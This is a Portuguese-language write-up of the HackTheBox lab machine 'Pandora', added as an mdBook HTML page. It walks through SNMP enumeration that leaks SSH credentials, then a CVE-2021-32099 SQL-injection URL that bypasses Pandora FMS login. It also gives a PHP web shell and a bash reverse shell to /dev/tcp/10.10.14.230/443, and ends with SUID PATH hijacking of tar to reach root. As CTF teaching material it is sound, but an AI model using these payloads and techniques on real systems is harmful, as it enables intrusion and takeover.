@@ -1,0 +1,397 @@
+<!DOCTYPE HTML>
+<html lang="pt" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Linux-Easy-Pandora - WriteUps HackTheBox - by JavaliMZ</title>
+        <!-- Custom HTML head -->
+<!-- Content here gets appended to the <html><head> of all the pages -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script
+	async
+	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
+></script>
+<script>
+	window.dataLayer = window.dataLayer || []; function
+	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
+	'G-ZCM4NEDCZB');
+</script>
+<!-- Custom HTML head: Twitter support -->
+<script
+	async
+	src='https://platform.twitter.com/widgets.js'
+	charset='utf-8'
+></script>
+
+<meta
+	name='google-site-verification'
+	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
+/>        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/additional.css">
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item "><a href="Introducao.html"><strong aria-hidden="true">1.</strong> Introdução</a></li><li class="chapter-item "><a href="Windows.html"><strong aria-hidden="true">2.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">2.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">2.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">2.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Cascade.html"><strong aria-hidden="true">2.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item "><a href="HTB-Windows-Hard-Blackfield.html"><strong aria-hidden="true">2.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">2.6.</strong> HTB-Windows-Insane-Bankrobber</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-APT.html"><strong aria-hidden="true">2.7.</strong> HTB-Windows-Insane-APT</a></li></ol></li><li class="chapter-item expanded "><a href="Linux.html"><strong aria-hidden="true">3.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="HTB-Linux-Easy-Pandora.html" class="active"><strong aria-hidden="true">3.1.</strong> HTB-Linux-Easy-Pandora</a></li><li class="chapter-item "><a href="HTB-Linux-Hard-Falafel.html"><strong aria-hidden="true">3.2.</strong> HTB-Linux-Hard-Falafel</a></li><li class="spacer"></li></ol></li><li class="chapter-item "><a href="Projetos-Antigos.html"><strong aria-hidden="true">4.</strong> Projetos Antigos de programação em puro Javascript</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><img src="Assets/HTB-Linux-Easy-Pandora/icon.png" alt="" /></p>
+<img src="https://img.shields.io/badge/Pandora-HackTheBox-green?style=plastic" width="200">
+<h1 id="resolução-da-máquina-pandora"><a class="header" href="#resolução-da-máquina-pandora">Resolução da máquina <strong>Pandora</strong></a></h1>
+<h4 id="máquina-easy-hacktheboxcom"><a class="header" href="#máquina-easy-hacktheboxcom">Máquina EASY (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---02022022"><a class="header" href="#by-javalimz---02022022">by <strong><em>JavaliMZ</em></strong> - 02/02/2022</a></h4>
+<hr />
+<hr />
+<h1 id="introdução"><a class="header" href="#introdução">Introdução</a></h1>
+<p>Boas pessoal. Já não escrevo writeups à muito tempo, e decidi escrever este porque a máquina é relativamente simples, e traz conceitos interessantes. Além disso, só tinha (à hora da elaboração deste writeup) apenas 1 máquina Linux, contra 7 máquinas Windows... Então decidi que era hoje que ia criar conteúdo novo.</p>
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
+<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
+<p>Seguindo a metodologia de sempre, começamos pela enumeração das portas da máquina:</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/nmap1.png" alt="nmap1" /></p>
+<p>Existem aparentemente apenas 2 portas aberta em TCP, a porta SSH e a porta HTTP.</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/nmap2.png" alt="nmap2" /></p>
+<p>Com a ferramenta <em>whatweb</em>, vemos ums emails relacionado com a máquina: <em><strong>contact@panda.htb</strong></em> e <em><strong>support@panda.htb</strong></em>. Podemos pensar em VirtualHosting, e servidor de email SMTP. Mas nenhuma porta está aberta...</p>
+<h2 id="virtualhosting-e-webpage"><a class="header" href="#virtualhosting-e-webpage">VirtualHosting e WebPage</a></h2>
+<p>Para verificar se existe virtual hosting, vamos começar pelo básico, adicionar o host ao /etc/hosts. Temos um potencial hostname válido, o <strong>panda.htb</strong></p>
+<pre><code class="language-bash">sudo su
+echo &quot;\n\n10.10.11.136\tpanda.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>Ao abrir o url http://10.10.11.136/ ou a http://panda.htb, não se verifica alterações nenhumas...</p>
+<p>Ao enumerar as rotas do site, tanto pelo http://10.10.11.136/ e pelo http://panda.htb, não se verifica nada de interessante. Enumerei também os nomes do hosts diferentes com a mesma ferramenta, e depois rodei todos os nomes dos novos hosts sem que nada de novo aparecesse. Para isso é preciso também adicionar os novos hosts ao /etc/hosts</p>
+<pre><code class="language-bash"># Enumeração das rotas do site http://panda.htb, bem como de possíveis ficheiros txt, js, html, php. Para o site http://10.10.11.136/ é só substituir... mas o resultado é o mesmo
+ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://panda.htb/FUZZ -t 200 -r -e .txt,.js,.html,.php
+
+# Enumeração dos hosts
+# Primeiro, perceber quantos caracteres compõem a mensagem de erro normal
+curl -s -H &quot;Host: iuagveifjhbakjdsbfkjabskdfjba.panda.htb&quot; http://panda.htb | wc -c  # 33560
+# Depois filtrar as resposta com esse tamanho para não aparecer uma lista enorme de falsos positivos adicionando &quot;-fs 33560&quot; ao commando para enumerar os hosts
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://panda.htb -H &quot;Host: FUZZ.panda.htb&quot; -t 200 -fs 33560
+</code></pre>
+<p>Não houve respostas nenhuma ao último comando... O site não apresenta nenhuma campo editável, nenhum parâmetro por explorar... Estamos bloqueados... O que fazer agora?</p>
+<p>Bem ainda não fizemos nada acerca das portas UDP! Por defeito, o nmap usa a flag -sT (TCP SCAN) mesmo não especificando manualmente a flag, mas existem mais. Para fazer um escaneamento às portas UDP, é preciso indicar-lhe a flag -sU (Necessita ser <strong>root</strong>!). Este método de Scan é extremamente lento, devido ao próprio protocolo em si.</p>
+<ul>
+<li>Em TCP, existe sempre a confirmação da resposta, em primeira instância para confirmar que o alvo está recetivo, e em segunda instância para confirmar que recebeu a mensagem</li>
+<li>Em UDP, é mais ao menos <em>Tenho isto para enviar, então envio. Só. Que se lixe se alguém recebe... Estou-me nas tintas</em>. São ditas <strong><em>ConnectionLess</em></strong></li>
+</ul>
+<p>Por isso, em UDP, o nmap não tem como saber se a conexão está a demorar porque não está aberta, ou foi bloqueada por firewall, ou se está aberto mas para um programa que não tem por função enviar uma resposta (está a receber caladinho a informação que o nmap enviou), ou seja o que for...</p>
+<p>Em suma, em UDP (e visto que estamos no CTF), podemos limitar o número de portas às top 20 portas comuns.</p>
+<pre><code class="language-bash">sudo nmap --top-ports 20 -sU $IP -vvv
+# ...
+# 161/udp   open          snmp         udp-response ttl 63
+# ...
+</code></pre>
+<p>Temos entre a resposta, a confirmação que uma porta está aberta! A porta UDP 161. Existem várias ferramentas para bruteforce do serviço SMNP associado. O <em>snmpwalk</em> e o <em>snmp-check</em></p>
+<p>Ambos fazem o mesmo, mas o snmpwalk apresenta o resultado em bruto! O que não é agradável à vista. Sendo assim, recomnedo mesmo o snmp-check para a enumeração do serviço SNMP</p>
+<h2 id="snmp"><a class="header" href="#snmp">SNMP</a></h2>
+<pre><code class="language-bash">snmp-check 10.10.11.136
+# ...
+# 127.0.0.1    3306         0.0.0.0      0            listen
+# 127.0.0.53   53           0.0.0.0      0            listen
+# ...
+# 1274   runnable   host_check   /usr/bin/host_check   -u daniel -p HotelBabylon23
+# ...
+</code></pre>
+<p>No meio de um pouco mais de 1200 linhas, podemos ver duas informações relevantes.</p>
+<ul>
+<li>Está a ser executado por uma tarefa cronica um comando <strong>&quot;host_check&quot;</strong> e vemos em texto claro possíveis credenciais...</li>
+<li>Existe realmente um serviço de virtualhosting a rodar na porta 53. Ainda não sabemos se é relevante ou não.
+<blockquote>
+<p>daniel:HotelBabylon23</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="getting-shell"><a class="header" href="#getting-shell">Getting Shell</a></h1>
+<h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
+<p>A porta SSH encontra-se aberta, e temos credenciais. Vamos simplesmente tentar fazer login via SSH.</p>
+<pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136
+</code></pre>
+<p>Entramos na máquina.</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/foothold.png" alt="foothold" /></p>
+<h2 id="enumeração-do-sistema"><a class="header" href="#enumeração-do-sistema">Enumeração do sistema</a></h2>
+<p>Após meia dúzia de comandos pela máquina, percebi o seguinte:</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/pandorabackup.png" alt="pandorabackup" /></p>
+<p>Existe um binário bastante suspeito! pandora_backup. É SUID. Significa que, neste caso, o usuário &quot;<em><strong>matt</strong></em>&quot; executa este ficheiro temporariamente enquanto usuário &quot;<em><strong>root</strong></em>&quot;. Logo, se conseguirmos ser &quot;<em><strong>matt</strong></em>&quot;, podemos tentar ver o que se passa com o binário, se apresenta algum tipo de vulnerabilidade.</p>
+<h2 id="virtualhost"><a class="header" href="#virtualhost">VirtualHost</a></h2>
+<p>Agora que estamos na máquina, podemos verificar se existe virtual hosting. Para isso, tenho feito da seguinte maneira:</p>
+<ul>
+<li>verificar o CMS</li>
+<li>Sabendo o CMS, pesquisar o diretório/ficheiro onde está armazenado a informação de virtual hosting.</li>
+</ul>
+<p>Para este caso, nos já sabemos o CMS que está a ser usado, pelo comando &quot;<strong><em>whatweb</em></strong>&quot; que efectuamos logo depois do nosso &quot;<strong><em>nmap</em></strong>&quot;. É um Apache 2.4.41. Normalmente, a pretendida informação encontra-se no diretório /etc/apache2/sites-available/</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/virtualhost.png" alt="virtualhost" /></p>
+<p>Agora sim podemos afirmar que existe algo mais. Exite um site geral, acessível por toda a web <strong>_(&lt;VirtualHost <em>:80&gt;)</em></strong> com o seu conteúdo definido em /var/www/html, e existe outro site, acessível apenas pelo localhost <strong><em>(&lt;VirtualHost localhost:80&gt;)</em></strong> cujo diretório referente encontra-se em /var/www/pandora.</p>
+<blockquote>
+<p>E agora? o que fazemos com esta informação?</p>
+</blockquote>
+<p>Podemos tentar ver os ficheiros todos do site, pode sempre ter informações, credenciais em texto claro... Mas primeiro, queremos simplesmente visualizar a página web. Para isso, vamos recorrer a port forwarding.</p>
+<blockquote>
+<p>Ok... Mas já estamos na máquina alvo... para que serve de &quot;sair&quot; para &quot;entrar&quot; de novo por outra via?</p>
+</blockquote>
+<pre><code class="language-bash">daniel@pandora:/var/www$ ll
+total 16
+drwxr-xr-x  4 root root 4096 Dec  7 14:32 ./
+drwxr-xr-x 14 root root 4096 Dec  7 14:32 ../
+drwxr-xr-x  3 root root 4096 Dec  7 14:32 html/
+drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 pandora/
+</code></pre>
+<p>Pode servir para diversas coisas. Pode o novo site ter um serviço com credenciais de todos os usuários, pode ter acesso a uma base de dados com mais privilégios, e muitas coisas mais...
+Neste caso serve para o seguinte:</p>
+<ul>
+<li>O site principal, aberto ao público, não tem nada de relevante, não tem pontos de entrada.</li>
+<li>O segundo site, apenas acessível pelo localhost, tem como proprietário e &quot;<em>AssignUserID</em>&quot; o usuário &quot;<em><strong>matt</strong></em>&quot;. Significa que tudo o que for feito nesta página será executado por &quot;<em><strong>matt</strong></em>&quot;!. Se for encontrado vulnerabilidades, podemos até executar código (RCE) com o usuário &quot;<em><strong>matt</strong></em>&quot;.</li>
+</ul>
+<h2 id="portforwarding"><a class="header" href="#portforwarding">PortForwarding</a></h2>
+<p>Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O &quot;<em><strong>Chisel</strong></em>&quot;. Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag &quot;<em><strong>-L</strong></em>&quot;</p>
+<pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
+</code></pre>
+<p>A partir de agora, o nosso próprio kali-linux (ou o sistema que for) está com a porta 80 ocupada com o servidor web da máquina vítima.</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/sitepandora.png" alt="sitepandora" /></p>
+<p>Estamos enfrentando uma página de login de um serviço chamado <strong>Pandora FMS</strong>. É basicamente um serviço de monitoramento de serviços. E por lá, podemos uploadar ficheiros sem restrições, e acessá-los também, o que significa que podemos executar código PHP de um ficheiro PHP que previamente se upload (RCE). Agora só falta entrar. Vamos ver primeiro se tem vulnerabilidades conhecidas. Precisamos para isso saber a versão do Pandora. O Pandora tem uma api, segundo a documentação, e lá, podemos ver como fazer para extrair a versão do pandora FMS</p>
+<blockquote>
+<p>https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi</p>
+</blockquote>
+<pre><code class="language-bash">curl http://127.0.0.1/pandora_console/include/api.php?info=version
+# Pandora FMS v7.0NG.742_FIX_PERL2020 - PC200103 MR34
+</code></pre>
+<p>Pesquisando com a ferramenta &quot;<em><strong>searchsploit</strong></em>&quot;, não foi possível executar nenhum exploit que lá estava. Pesquisando pelo google, vi que o próprio site da Pandora FMS tem tudo sobre as suas vulnerabilidades!</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/pandoraexposures.png" alt="pandoraexposures" /></p>
+<h2 id="cve-2021-32099"><a class="header" href="#cve-2021-32099">CVE-2021-32099</a></h2>
+<p>Esta vulnerabilidade parece perfeita para o nosso caso. A versão é exatamente a mesma, e permite um usuário random não autenticado de simplesmente entrar.</p>
+<blockquote>
+<p>Existe também um exelente artigo a explicar a vulnerabilidade: <br> https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</p>
+</blockquote>
+<p>E no github, encontramos tudo e mais alguma coisa sobre todos os assuntos! Este assunto não é exceção.</p>
+<blockquote>
+<p>https://github.com/ibnuuby/CVE-2021-32099</p>
+</blockquote>
+<p>Pelos vistos basta entrar na página normal de login, e adicionar à URL <strong>http://localhost/pandora_console/</strong> o seguinte: <strong>include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271</strong></p>
+<p>Depois voltar á página inicial de login e já está...
+<strong>http://localhost/pandora_console/</strong></p>
+<h2 id="rce-com-usuário-matt"><a class="header" href="#rce-com-usuário-matt">RCE com usuário <strong>matt</strong></a></h2>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/filemanager.png" alt="filemanager" /></p>
+<p>Para executar comandos, é bastante simples. No File manager, é só fazer o upload de um ficheiro para executar comando. Eu vou logo executar o reverse shell, mas poderiamos criar outro ficheiro:</p>
+<pre><code class="language-php"># Existe mil e uma forma de executar comandos, dependendo de como está montado o serviço PHP. Para dar apenas 1 exemplo:
+# Para RCE, através de um parâmetro:
+&lt;?php
+     echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
+     echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+?&gt;
+
+# Para directamente ter o reverse shell:
+&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.230/443 0&gt;&amp;1'&quot;);?&gt;
+</code></pre>
+<pre><code class="language-bash"># Executar o nc em modo de escuta para receber o shell:
+kali@kali: &gt;     nc -lvnp 443
+
+# Em outra consola, executar o ficheiro que &quot;uploadamos&quot; (Eu escolhi chamar o ficheiro de shell.php...)
+kali@kali: &gt;     curl http://localhost/pandora_console/images/shell.php
+</code></pre>
+<h3 id="estabilizar-o-reverse-shell"><a class="header" href="#estabilizar-o-reverse-shell">Estabilizar o Reverse Shell</a></h3>
+<pre><code class="language-bash">script /dev/null -c bash
+export TERM=xterm
+export SHELL=bash
+
+# Ctrl + Z
+stty raw -echo; fg; reset
+stty rows 40 columns 170  # Tem corresponder ao vosso ecrã (stty -a numa consola do Kali)
+</code></pre>
+<h1 id="escalada-de-privilégio"><a class="header" href="#escalada-de-privilégio">Escalada de privilégio</a></h1>
+<p>Agora que somos matt, podemos analisar o tal binário pandora_backup</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/tar.png" alt="tar" /></p>
+<p>No meio desses caracteres todos, podemos ver um clienttar -cvf /root/...</p>
+<p>Este parece ser um unico comando &quot;<em><strong>tar</strong></em>&quot; que se colou ao &quot;client&quot; por não haver caracteres ASCII pelo meio. O que quero dizer é que, quem fez o binário, aparentemente, usou um simples comando &quot;<em><strong>tar</strong></em>&quot; para fazer o backup, mas não usou o caminho completo para chamar a ferramenta.</p>
+<p>O que isto quer dizer? </p>
+<h2 id="path-hijacking"><a class="header" href="#path-hijacking">Path Hijacking</a></h2>
+<p>Sabemos que o binário pandora_backup usa o tar. Onde se encontra isso?</p>
+<pre><code class="language-bash">which tar
+# /usr/bin/tar
+</code></pre>
+<p>Ok. Mas como é que o computador sabe que está ali o programa? Existe uma variável no shell que indica isso. Chama-se PATH:</p>
+<pre><code class="language-bash">echo $PATH
+# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre>
+<p>É assim que o computador procura o programa, primeiro procura em &quot;<em><strong>/usr/local/sbin</strong></em>&quot;, depois em &quot;<em><strong>/usr/local/bin</strong></em>&quot;... Todas as pastas estão separadas pelos dois pontos &quot;:&quot;.
+Mas esta variável é apenas uma variável do nosso shell actual, que facilmente se altera.</p>
+<pre><code class="language-bash">export PATH=.:$PATH
+echo $PATH
+# .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
+</code></pre>
+<p>Adicionamos um ponto &quot;.&quot; à primeira pasta onde o computador vai procurar pelo programa. Significa que o computador vai procurar no diretório atual, e só depois nos outros diretórios.</p>
+<p>Assim, basta criar um executável de nome &quot;<em><strong>tar</strong></em>&quot; numa pasta qualquer, e executar o binário pandora_backup a partir da mesma posição, para o linux assumir que o &quot;<em><strong>tar</strong></em>&quot; correto é o nosso próprio ficheiro &quot;<em><strong>tar</strong></em>&quot;. E, já que o binário pandora_backup é SUID, e o seu proprietário é &quot;<em><strong>root</strong></em>&quot;, significa que podemos escrever o que nos apetecer para que seja executado como &quot;<em><strong>root</strong></em>&quot;. O mais fácil é chamar um bash novo...</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/pathhijacknotwork.png" alt="pathhijacknotwork" /></p>
+<h4 id="não-funcionou-porquê"><a class="header" href="#não-funcionou-porquê">Não funcionou! Porquê?</a></h4>
+<p>Sinceramente não sei, o que sei é que pelo ssh funcionou nesta máquina... Quando vi que não funcionou, procurei outra solução. criei uma chave id_rsa só para ter melhor conexão, conectei-me via SSH e o mesmo exploit funcionou... OK. Mistérios do Hacking!</p>
+<pre><code class="language-bash">ssh-keygen
+cd /home/matt/.ssh
+cat id_rsa.pub &gt; authorized_keys
+cat id_rsa
+# Copiar o conteúdo e colar num novo ficheiro no nosso kali
+kali@kali: &gt;     nano id_rsa
+kali@kali: &gt;     # Colar e gravar
+kali@kali: &gt;     chmod 600 id_rsa
+kali@kali: &gt;     ssh matt@10.10.11.136 -i id_rsa
+</code></pre>
+<p>E agora, exatamente da mesma posição, alterando primeiro a variável PATH, optemos uma shell root</p>
+<p><img src="Assets/HTB-Linux-Easy-Pandora/root.png" alt="root" /></p>
+<p>Agora só falta as flags...</p>
+<blockquote>
+<p>Obrigador por lerem o writeup! Até à próxima<br>
+Criadores da máquina: TheCyberGeek e dmw0ng</p>
+</blockquote>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Linux.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Linux.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="HTB-Linux-Hard-Falafel.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
